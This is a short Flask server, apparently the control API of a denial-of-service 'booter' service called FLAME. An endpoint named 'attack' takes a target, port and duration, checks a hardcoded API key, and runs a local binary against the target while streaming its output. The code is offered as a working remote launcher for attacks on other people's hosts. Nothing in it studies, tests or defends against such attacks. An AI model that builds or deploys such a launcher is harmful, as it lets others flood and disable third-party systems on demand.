from flask import Flask, request, Response
import subprocess
import os

app = Flask(__name__)

BINARY_PATH = "/app/raj"

@app.route('/api/start')
def attack():
    key = request.args.get('key')
    target = request.args.get('target')
    port = request.args.get('port')
    duration = request.args.get('time')

    if not key or not target or not port or not duration:
        return {"error": "Missing parameters"}

    # Validate key
    if key != "FLAME_0wp8pzavEQ7ZB0S6Y3J_Bcn5wxRwanC-xQehPgBWp8E":
        return {"error": "Invalid API Key"}

    if not os.path.exists(BINARY_PATH):
        return {"error": f"Binary not found at {BINARY_PATH}"}

    os.chmod(BINARY_PATH, 0o755)

    cmd = [BINARY_PATH, target, str(port), str(duration)]

    def generate():
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                   text=True, bufsize=1)
        for line in process.stdout:
            yield line
        process.wait()

    return Response(generate(), mimetype='text/plain')

@app.route('/')
def home():
    return {"status": "FLAME API", "binary": BINARY_PATH}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
